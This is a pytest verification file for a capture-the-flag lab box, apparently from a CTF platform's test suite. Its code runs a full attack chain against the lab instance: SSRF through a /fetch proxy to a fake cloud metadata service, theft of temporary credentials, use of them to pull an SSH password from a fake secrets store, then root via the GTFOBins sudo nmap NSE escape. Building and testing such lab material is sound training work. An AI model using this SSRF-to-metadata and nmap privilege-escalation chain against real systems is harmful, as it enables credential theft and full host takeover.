"""Phase 16 verification: cloudbreak-intermediate-metadata -- the
Intermediate tier of "Cloudbreak Pipeline". A real SSRF vulnerability
(the vendor-invoice "preview" app's /fetch endpoint, same weak
"localhost"-substring filter as intermediate-portside's own /preview)
is used to reach a fake cloud instance metadata service (IMDS, bound to
the real link-local address 169.254.169.254 via a NET_ADMIN-added
loopback alias), steal a role's temporary credentials, then use the
stolen AccessKeyId against a small fake Secrets Manager to recover an
SSH credential -- a different objective from intermediate-portside's
own SSRF (which targets an internal diagnostics API, not cloud
credentials).

Plain single-host box, no backend-specific dependency, works on both
Docker and Kubernetes. 10 real flags, climbing difficulty: web recon
(flags 1-2) -> confirming the SSRF reaches an internal-only service
(flag 3) -> pivoting the same SSRF to the fake IMDS to steal temporary
credentials (flags 4-5) -> using those credentials against the fake
Secrets Manager (flag 6) -> SSH foothold via the recovered credential
(flag 7) -> a sudo/GTFOBins ('nmap') privesc hint (flag 8) -> full root
shell via the same escape (flags 9-10).

Real HTTP, a real SSH session, a real privilege escalation -- no
mocks. Requires the box image already built
(ctf-boxes/cloudbreak-intermediate-metadata:latest), `sshpass` on PATH,
and a running orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "cloudbreak-intermediate-metadata"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

SSH_PASSWORD = "NimbusDeploy-Rotate-Me-42!"  # fixed/narrative -- discoverable via the stolen Secrets Manager entry
ACCESS_KEY_ID = "AKIANIMBUSDEPLOY01"  # fixed identifier, not itself a secret -- same every team


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _fetch(base: str, target_url: str) -> str:
    """Goes through the box's own SSRF-vulnerable /fetch proxy, exactly
    the way a real player would -- never hits the internal/IMDS/
    secrets-manager services directly (they have no published port)."""
    r = requests.get(f"{base}/fetch", params={"url": target_url}, timeout=15)
    r.raise_for_status()
    return r.text


def _ssh(host: str, port: int, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", SSH_PASSWORD, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"svc-deploy@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_nmap(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc: svc-deploy has passwordless
    sudo on /usr/bin/nmap -- the classic GTFOBins NSE-script escape,
    run as root.

    Nmap's Lua interpreter runs an .nse file's top-level statements
    (including this os.execute() call) as a side effect of merely
    *loading* the module, before it validates the module as a proper
    script (which requires an 'action' function this one deliberately
    lacks) -- so the command genuinely executes as root, but nmap then
    rejects the script and exits non-zero regardless. Confirmed by
    direct reproduction: the marker and the command's real output are
    both present in stdout even though the process's own exit code is
    1 -- so the marker's presence is the real success signal here, not
    the exit code."""
    marker = "ctf-privesc-marker"
    nse = f'os.execute("{shell_command} && echo {marker}")'
    remote_cmd = (
        f"echo '{nse}' > /tmp/x.nse && "
        "sudo nmap --script=/tmp/x.nse -sC -p80 127.0.0.1 2>&1"
    )
    result = _ssh(host, port, remote_cmd)
    assert marker in result.stdout, (
        f"GTFOBins nmap escalation failed: rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
    )
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    web_port, ssh_port = _port(inst, 5000), _port(inst, 22)
    base = f"http://{host}:{web_port}"

    # Flags 1-2: plain web recon, including the IMDS hint.
    docs = requests.get(f"{base}/docs", timeout=10).text
    assert expected_flag(secret, 1) in docs
    changelog = requests.get(f"{base}/changelog", timeout=10).text
    assert expected_flag(secret, 2) in changelog
    assert "169.254.169.254" in changelog  # the hint toward the real target

    # Flag 3: SSRF reaches an internal-only service with no published port.
    ping = _fetch(base, "http://127.0.0.1:5001/ping")
    assert expected_flag(secret, 3) in ping

    # Flag 4: pivot the same SSRF to the fake IMDS -- the role name.
    role_list = _fetch(base, "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    assert expected_flag(secret, 4) in role_list
    assert "nimbus-deploy-role" in role_list

    # Flag 5: the stolen temporary credentials themselves.
    creds = _fetch(base, "http://169.254.169.254/latest/meta-data/iam/security-credentials/nimbus-deploy-role")
    assert expected_flag(secret, 5) in creds
    assert ACCESS_KEY_ID in creds

    # Flag 6: use the stolen AccessKeyId against the fake Secrets Manager.
    secret_value = _fetch(
        base,
        f"http://127.0.0.1:8600/secretsmanager/get-secret-value?SecretId=nimbus/prod/ssh&AccessKeyId={ACCESS_KEY_ID}",
    )
    assert expected_flag(secret, 6) in secret_value
    assert SSH_PASSWORD in secret_value
    assert "svc-deploy" in secret_value

    # The gate actually gates -- a wrong/missing credential is denied.
    denied = _fetch(base, "http://127.0.0.1:8600/secretsmanager/get-secret-value?SecretId=nimbus/prod/ssh&AccessKeyId=WRONG")
    assert "AccessDenied" in denied

    # Flag 7: SSH foothold via the recovered credential.
    user_txt = _ssh(host, ssh_port, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 7) in user_txt.stdout

    # A hint file pointing at the sudo/GTFOBins privesc.
    sudo_l = _ssh(host, ssh_port, "sudo -l")
    assert "/usr/bin/nmap" in sudo_l.stdout

    # Flag 8: a root-only file, read via the GTFOBins escape before going for a full shell.
    audit_log = _escalate_via_nmap(host, ssh_port, "cat /var/log/nmap-scan-audit.log")
    assert expected_flag(secret, 8) in audit_log

    # Flags 9-10: full root shell via the same escape.
    root_output = _escalate_via_nmap(host, ssh_port, "cat /root/decommission_notes.txt /root/root.txt")
    assert expected_flag(secret, 9) in root_output
    assert expected_flag(secret, 10) in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 5000)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 5000)
        docs_a = requests.get(f"http://{host_a}:{port_a}/docs", timeout=10).text
        docs_b = requests.get(f"http://{host_b}:{port_b}/docs", timeout=10).text
        assert expected_flag(secret, 1) in docs_a
        assert expected_flag(secret_b, 1) in docs_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in docs_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
